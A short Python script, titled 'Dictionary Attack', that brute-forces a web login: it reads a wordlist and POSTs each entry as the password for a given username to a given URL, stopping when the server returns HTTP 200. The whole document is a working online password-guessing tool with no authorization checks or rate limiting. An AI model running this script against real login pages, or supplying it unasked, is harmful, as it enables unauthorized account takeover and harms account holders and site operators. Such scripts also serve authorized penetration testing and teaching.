import requests
import argparse

parser = argparse.ArgumentParser(description="Dictionary Attack")

parser.add_argument("--username", required=True, help="Username")
parser.add_argument("--url", required=True, help="URL")
parser.add_argument("--wordlist", required=True, help="Wordlist")

parser.add_argument("--verbose", action="store_true", help="Enable verbose mode")

# Parse the arguments
args = parser.parse_args()

with open(args.wordlist,'r') as file:
    for line in file:
        if args.verbose:
            print("Trying: "+line)
        response = requests.post(args.url,data={"username":args.username,"password":line.strip()})        
        if (response.status_code == 200) :
            print("Password found for ["+args.username+"]: "+line)
            break
